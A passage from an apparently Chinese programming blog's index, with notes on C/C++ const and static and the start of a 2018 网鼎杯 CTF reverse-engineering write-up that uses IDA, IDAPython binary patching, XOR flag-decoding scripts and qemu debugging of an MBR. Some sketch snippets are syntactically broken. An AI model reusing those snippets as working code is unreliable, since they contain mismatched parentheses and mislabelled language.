<code>++_cm</code>没有用 <code>mutable</code>修饰</p><h2 id="const-char-和-char-const-和-char-const"><a href="#const-char-和-char-const-和-char-const" class="headerlink" title="const char 和 char const 和 char * const"></a>const char <em>和 char const</em> 和 char * const</h2><p><strong>const char *<strong>与</strong>char const *</strong> 效果一样, 都是不允许修改指针指向的地址空间的值, 即把值作为常量, 而<strong>char * const</strong>则是不允许修改指针自身, 不能再指向其他地方, 把指针自己当作常量使用。需要注意的是, 使用<strong>char * const</strong> 定一个常量指针的时候一定记得赋初始值, 否则再其他地方就没法赋值了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/jack-hzm/p/8098204.html">C++ const 用法小结</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Static</title>
      <link href="/note-binary-static/"/>
      <url>/note-binary-static/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>普通局部变量是再熟悉不过的变量了, 在任何一个函数内部定义的变量（不加static修饰符）都属于这个范畴。编译器一般不对普通局部变量进行初始化, 也就是说它的值在初始时是不确定的, 除非对其显式赋值。</p><ul><li>普通局部变量存储于进程栈空间, 使用完毕会立即释放。</li></ul><p>静态局部变量使用static修饰符定义, 即使在声明时未赋初值, 编译器也会把它初始化为0。且静态局部变量存储于进程的全局数据区, 即使函数返回, 它的值也会保持不变。</p><ul><li>变量在全局数据区分配内存空间；编译器自动对其初始化<br>其作用域为局部作用域, 当定义它的函数结束时, 其作用域随之结束</li></ul><p>示例代码如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;num:&quot;</span> &lt;&lt; num++ &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun_static</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;static num:&quot;</span> &lt;&lt; num++ &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fun</span>();</span><br><span class="line">    <span class="built_in">fun_static</span>();</span><br><span class="line">    <span class="built_in">fun</span>();</span><br><span class="line">    <span class="built_in">fun_static</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/mnt/d/Computer/C++ learns/cmake-build-release/Cpp_learns&quot;</span><br><span class="line">num:10</span><br><span class="line">static num:10</span><br><span class="line">num:10</span><br><span class="line">static num:11</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><p>在<code>fun()</code>中, 即便<code>num++</code>下次运行<code>num还是10</code>, 但对于<code>fun_static()</code>, <code>num++</code>会影响到下次运行的结果, 证明当局部变量加上<code>static</code>关键字后, 在函数结束时, 它的值也保持不变, 并不会被释放</p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>全局变量定义在函数体外部, 在全局数据区分配存储空间, 且编译器会自动对其初始化。</p><p>普通全局变量对整个工程可见, 其他文件可以使用extern外部声明后直接使用。也就是说其他文件不能再定义一个与其相同名字的变量了（否则编译器会认为它们是同一个变量）。</p><p>静态全局变量仅对当前文件可见, 其他文件不可访问, 其他文件可以定义与其同名的变量, 两者互不影响。</p><ul><li>在定义不需要与其他文件共享的全局变量时, 加上static关键字能够有效地降低程序模块之间的耦合, 避免不同文件同名变量的冲突, 且不会误使用。</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数的使用方式与全局变量类似, 在函数的返回类型前加上static, 就是静态函数。其特性如下:</p><ul><li><p>静态函数只能在声明它的文件中可见, 其他文件不能引用该函数</p></li><li><p>不同的文件可以使用相同名字的静态函数, 互不影响</p></li><li><p>非静态函数可以在另一个文件中直接引用, 甚至不必使用extern声明</p></li></ul><p>下面两个文件的例子说明不使用static声明的函数文件互相影响</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* file.cpp */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;hello from fun&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello from fun1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fun</span>();</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* file2.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello from static fun1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/cc9s5Fnk.o: In function `fun1()&#x27;:</span><br><span class="line">file2.cpp:(.text+0x0): multiple definition of `fun1()&#x27;</span><br><span class="line">/tmp/ccQcjpLK.o:file.cpp:(.text+0x2f): first defined here</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure><p>修改文件</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* file.cpp */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;hello from fun&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello from fun1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fun</span>();</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* file2.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello from static fun1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Desktop g++ file.cpp file2.cpp</span><br><span class="line">➜  Desktop ./a.out</span><br><span class="line">hello from fun</span><br><span class="line">hello from fun1</span><br></pre></td></tr></table></figure><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="静态数据成员"><a href="#静态数据成员" class="headerlink" title="静态数据成员"></a><strong>静态数据成员</strong></h3><p>在类内数据成员的声明前加上关键字static, 该数据成员就是类内的静态数据成员。先举一个静态数据成员的例子。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fun</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">fun</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetSum</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> Sum;<span class="comment">//声明静态数据成员</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fun::Sum = <span class="number">0</span>;<span class="comment">//定义并初始化静态数据成员</span></span><br><span class="line"></span><br><span class="line">fun::<span class="built_in">fun</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c) &#123;</span><br><span class="line">    Sum += a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun::GetSum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Sum = &quot;</span> &lt;&lt; Sum &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">fun <span class="title">M</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">    M.<span class="built_in">GetSum</span>();</span><br><span class="line">    <span class="function">fun <span class="title">N</span><span class="params">(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span></span>;</span><br><span class="line">    N.<span class="built_in">GetSum</span>();</span><br><span class="line">    M.<span class="built_in">GetSum</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出, 静态数据成员有以下特点:</p><ul><li>对于非静态数据成员, 每个类对象都有自己的拷贝。而静态数据成员被当作是类的成员。无论这个类的对象被定义了多少个, 静态数据成员在程序中也只有一份拷贝, 由该类型的所有对象共享访问。也就是说, 静态数据成员是该类的所有对象所共有的。对该类的多个对象来说, 静态数据成员只分配一次内存, 供所有对象共用。所以, 静态数据成员的值对每个对象都是一样的, 它的值可以更新；</li><li>静态数据成员存储在全局数据区。静态数据成员定义时要分配空间, 所以不能在类声明中定义。在上述代码中, 语句<code>int Myclass::Sum=0;</code>是定义静态数据成员；</li><li>静态数据成员和普通数据成员一样遵从<code>public , protected , private</code>访问规则；</li><li>因为静态数据成员在全局数据区分配内存, 属于本类的所有对象共享, 所以, 它不属于特定的类对象, 在没有产生类对象时其作用域就可见, 即在没有产生类的实例时, 我们就可以操作它；</li><li>静态数据成员初始化与一般数据成员初始化不同。静态数据成员初始化的格式为:<br>＜数据类型＞＜类名＞::＜静态数据成员名＞=＜值＞</li><li>类的静态数据成员有两种访问形式:<br>＜类对象名＞.＜静态数据成员名＞ 或 ＜类类型名＞::＜静态数据成员名＞<br>如果静态数据成员的访问权限允许的话（即public的成员）, 可在程序中, 按上述格式来引用静态数据成员 ；</li><li>静态数据成员主要用在各个对象都有相同的某项属性的时候。比如对于一个存款类, 每个实例的利息都是相同的。所以, 应该把利息设为存款类的静态数据成员。这有两个好处, 第一, 不管定义多少个存款类对象, 利息数据成员都共享分配在全局数据区的内存, 所以节省存储空间。第二, 一旦利息需要改变时, 只要改变一次, 则所有存款类对象的利息全改变过来了；</li><li>同全局变量相比, 使用静态数据成员有两个优势:<ul><li>静态数据成员没有进入程序的全局名字空间, 因此不存在与程序中其它全局名字冲突的可能性；</li><li>可以实现信息隐藏。静态数据成员可以是private成员, 而全局变量不能；</li></ul></li></ul><h3 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h3><p>与静态数据成员一样, 我们也可以创建一个静态成员函数, 它为类的全部服务而不是为某一个类的具体对象服务。静态成员函数与静态数据成员一样, 都是类的内部实现, 属于类定义的一部分。普通的成员函数一般都隐含了一个this指针, this指针指向类的对象本身, 因为普通成员函数总是具体的属于某个类的具体对象的。通常情况下, this是缺省的。如函数<code>fn()</code>实际上是<code>this-&gt;fn()</code>。但是与普通函数相比, 静态成员函数由于不是与任何的对象相联系, 因此它不具有this指针。从这个意义上讲, 它无法访问属于类对象的非静态数据成员, 也无法访问非静态成员函数, 它只能调用其余的静态成员函数。下面举个静态成员函数的例子。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fun</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">fun</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetSum</span><span class="params">()</span></span>;  <span class="comment">//声明静态成员函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> Sum;<span class="comment">//声明静态数据成员</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fun::Sum = <span class="number">0</span>;<span class="comment">//定义并初始化静态数据成员</span></span><br><span class="line"></span><br><span class="line">fun::<span class="built_in">fun</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c) &#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;a = a;</span><br><span class="line">    Sum += a + b + c; <span class="comment">//非静态成员函数可以访问静态数据成员</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun::GetSum</span><span class="params">()</span> <span class="comment">//静态成员函数的实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// std::out &lt;&lt; a &lt;&lt; std::endl; //错误代码, a是非静态数据成员, 编译时报错:Invalid use of member &#x27;a&#x27; in static member function</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Sum = &quot;</span> &lt;&lt; Sum &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">fun <span class="title">M</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">    M.<span class="built_in">GetSum</span>();</span><br><span class="line">    <span class="function">fun <span class="title">N</span><span class="params">(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span></span>;</span><br><span class="line">    N.<span class="built_in">GetSum</span>();</span><br><span class="line">    fun::<span class="built_in">GetSum</span>(); <span class="comment">// 注意与之前的调用区别</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/mnt/d/Computer/C++ learns/cmake-build-release/Cpp_learns&quot;</span><br><span class="line">Sum = 6</span><br><span class="line">Sum = 21</span><br><span class="line">Sum = 21</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><p>关于静态成员函数, 可以总结为以下几点:</p><ul><li><p>出现在类体外的函数定义不能指定关键字static；</p></li><li><p>静态成员之间可以相互访问, 包括静态成员函数访问静态数据成员和访问静态成员函数；</p></li><li><p>非静态成员函数可以任意地访问静态成员函数和静态数据成员；</p></li><li><p>静态成员函数不能访问非静态成员函数和非静态数据成员；</p></li><li><p>由于没有this指针的额外开销, 因此静态成员函数与类的全局函数相比速度上会有少许的增长；</p></li><li><p>调用静态成员函数, 可以用成员访问操作符(.)和(-&gt;)为一个类的对象或指向类对象的指针调用静态成员函数, 也可以直接使用如下格式:</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">＜类名＞::＜静态成员函数名＞（＜参数表＞）</span><br></pre></td></tr></table></figure><p>调用类的静态成员函数</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 网鼎杯</title>
      <link href="/wp-games-2018wd/"/>
      <url>/wp-games-2018wd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Beijing"><a href="#Beijing" class="headerlink" title="Beijing"></a>Beijing</h2><p>32位ELF, 运行输出一堆乱码, IDA静态分析后发现输出一堆数字异或值。</p><p>根据第一个异或过程, 前一个字符为’4’, 后一个字符为’f’</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">  v2 = byte_804A02D ^ byte_804A02C;</span><br></pre></td></tr></table></figure><p>第二个异或过程, 前一个字符为’ ‘(空格), 后一个字符为’l’</p><p>猜测每次异或的后一个数字为flag中字符的十六进制,<br>查看所有异或值可以看到<code>flag&#123;&#125;</code>都在里面</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/beijing-numbers.jpg" alt="beijing-numbers"></p><p>我们直接用 IDApython patch一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">bg = <span class="number">0x804848A</span></span><br><span class="line">end = <span class="number">0x08048604</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch</span>(<span class="params">begin</span>):</span></span><br><span class="line">    buff = [<span class="number">0xb9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x90</span>, <span class="number">0x90</span>]</span><br><span class="line">    ida_bytes.patch_bytes(begin, <span class="built_in">str</span>(<span class="built_in">bytearray</span>(buff)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr + ItemSize(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    <span class="built_in">next</span> = next_instr(addr)</span><br><span class="line">    MakeCode(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;movsx   ecx&quot;</span> <span class="keyword">in</span> GetDisasm(addr):</span><br><span class="line">        patch(addr)</span><br><span class="line">        <span class="built_in">print</span>(addr)</span><br><span class="line">    addr = <span class="built_in">next</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接运行得flag: <code>flag&#123;amazing_beijing&#125;</code></p><h2 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h2><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>这道题如果正常去逆向的话是真的麻烦, 结果师傅发现了非预期解。</p><p>正常运行程序会输出一串 identification , 拖进 IDA 里面看发现是静态字符串 <code>%02x</code>输出, 不知道跟 flag 有什么关系, 但是程序正常逻辑中有多次逻辑相似的异或操作, 因此尝试对该字符串异或 <code>flag&#123;</code>发现规律, 每次都是异或<code>[45, 44]</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s = b<span class="string">&quot;K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ&quot;</span></span><br><span class="line"></span><br><span class="line">flag = bytearray()</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    flag.append(s[i] ^ <span class="number">45</span>)</span><br><span class="line">    flag.append(s[i+<span class="number">1</span>] ^ <span class="number">44</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://qy.sg/csaw-ctf-quals-2016-deedeedee/">CSAW CTF Quals 2016</a></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在题目中有很多函数被定义, 本能告诉作者(这大概就是题做多了吧……)有一个加密函数, 因此可以用<code>objdump -x</code>先找函数加密函数, 也可以直接在IDA的函数框中搜索, 这里是因为即便变量名被混淆但仍然能基本看出函数功能</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/advanced-find_encrypt_function.jpg" alt="advanced-find_encrypt_function"></p><p>这里截取部分函数的汇编代码:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/advanced-encrypt_function.jpg" alt="advanced-encrypt_function"></p><p>可以看到, 每个函数都需要两个参数, 而函数名基本只有中间部分不同, 并且以<code>_D3src__T3encVAyaa3_313131ZQsFNaNfQuZQx</code>为例, 我们可以猜测<code>encVAyaa3</code>中3表示后面有3位, 正好<code>313131</code>为3位。</p><p>这个意义在进入函数后可以明白, 所有函数操作基本一致, 以<code>_D3src__T3encVAyaa3_313131ZQsFNaNfQuZQx</code>为例:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/advanced-fun_111.jpg" alt="advanced-fun_111"></p><p>这里可以看到其中有个函数<code>D3std5range__T5cycleTAyaZQlFNaNbNiNfQpZSQBnQBm__T5CycleTQBjZQl</code>, 有着的参数为三个, 第二个为<code>3</code>, 第三个为<code>&quot;111&quot;</code>, 和函数名一致, 因此我们只需要分析一个函数, 就可以根据函数名知道所有函数的操作</p><p>我们用IDA断在开头, 直接<code>set ip</code>到encrypt函数中, 修改rsi和rdi的值分别为<code>&quot;333&quot;</code>和<code>3</code>, 接着断在第二个xor处, 直接查看此时参与异或的值:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/advanced-fun1_v12.jpg" alt="advanced-fun1_v12"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/advanced-fun1_v12.jpg" alt="advanced-fun1_v12"></p><p>继续运行可能由于堆栈不平的关系, 发生错误, 则这里我们可以猜测这第一个函数用python表示为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_111</span>(<span class="params"><span class="built_in">input</span>, input_length</span>):</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)) ^ <span class="number">0x31</span> ^ input_length)</span><br></pre></td></tr></table></figure><p>这里0x31根据函数名的不同而不同, 如果为<code>&quot;313031303130&quot;</code>, 那就是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_101010</span>(<span class="params"><span class="built_in">input</span>, input_length</span>):</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">input</span>, cycle(<span class="string">&quot;101010&quot;</span>):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c)) ^ <span class="built_in">ord</span>(k) ^ input_length)</span><br></pre></td></tr></table></figure><p>因此根据函数名可以写出解题脚本为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">key, enc, enc_len</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(a) ^ <span class="built_in">ord</span>(b) ^ enc_len) <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(cycle(key), enc))</span><br><span class="line">keys = [<span class="built_in">str</span>(x)*<span class="number">3</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">    enc_len = <span class="built_in">len</span>(enc) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    enc = xor(key, enc, enc_len)</span><br><span class="line"><span class="built_in">print</span> enc</span><br></pre></td></tr></table></figure><p>得到flag:<code>flag&#123;d_with_a_template_phew&#125;</code></p><h2 id="blend"><a href="#blend" class="headerlink" title="blend"></a>blend</h2><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/TechSecCTF/writeups/blob/master/CSAWQuals2017/realism/README.md">CSAW CTF 2017 - Realism (400 pts)</a></p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>文件给了一个<a href="https://en.wikipedia.org/wiki/Master_boot_record">MBR</a>, 因此需要用qemu模拟启动, <code>-s</code>表示开启端口调试使得gdb可以远程attach上去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -drive format=raw, file=main.bin -s</span><br></pre></td></tr></table></figure><p>启动后如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/blend-interface.jpg" alt="blend-interface"></p><p>随便输入一串字符串进行验证</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/blend-interface2.jpg" alt="blend-interface2"></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>根据write up, <code>First, we load the MBR into IDA, and after some tinkering, realize it gives a nice disassembly in 16-bit mode</code>, 因此我们用16位模式加载他。但其实根据<a href="%5Bhttps://baike.baidu.com/item/%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95/7612638?fromtitle=mbr&fromid=10473976%5D(https://baike.baidu.com/item/%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95/7612638?fromtitle=mbr&fromid=10473976)">百度百科</a>上<code>MBR中的分区信息结构</code>中的<code>每个分区表的项目是16个字节</code>也可以猜测使用16位模式加载。这里是使用小端序。</p><p>根据<code>MBR的主要功能及工作流程</code>中</p><blockquote><p>启动PC机时, 系统首先对硬件设备进行测试, 测试成功后进入自举程序INT 19H, 然后读系统磁盘0柱面、0磁头、1扇区的主引导记录（MBR）内容到内存指定单元0:7C00地址开始的区域, 并执行MBR程序段</p></blockquote><p>因此修改段地址为<code>0x7C00</code>, <a href="https://github.com/TechSecCTF/writeups/blob/master/CSAWQuals2017/realism/realism.ida">最终结果</a>(这里附上write up的代码, 常数部分不同)</p><p>程序在<code>0x7C6F</code>处检查<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:7C6F                 cmp     dword ptr ds:1234h, &#x27;galf&#x27;</span><br><span class="line">seg000:7C78                 jnz     loc_7D4D</span><br><span class="line">seg000:7C7C                 movaps  xmm0, xmmword ptr ds:1238h</span><br><span class="line">seg000:7C81                 movaps  xmm5, xmmword ptr ds:loc_7C00</span><br><span class="line">seg000:7C86                 pshufd  xmm0, xmm0, 1Eh</span><br><span class="line">seg000:7C8B                 mov     si, 8</span><br><span class="line">seg000:7C8E</span><br><span class="line">seg000:7C8E loc_7C8E:                               ; CODE XREF: seg000:7CC1↓j</span><br><span class="line">seg000:7C8E                 movaps  xmm2, xmm0</span><br><span class="line">seg000:7C91                 andps   xmm2, xmmword ptr [si+7D90h]</span><br><span class="line">seg000:7C96                 psadbw  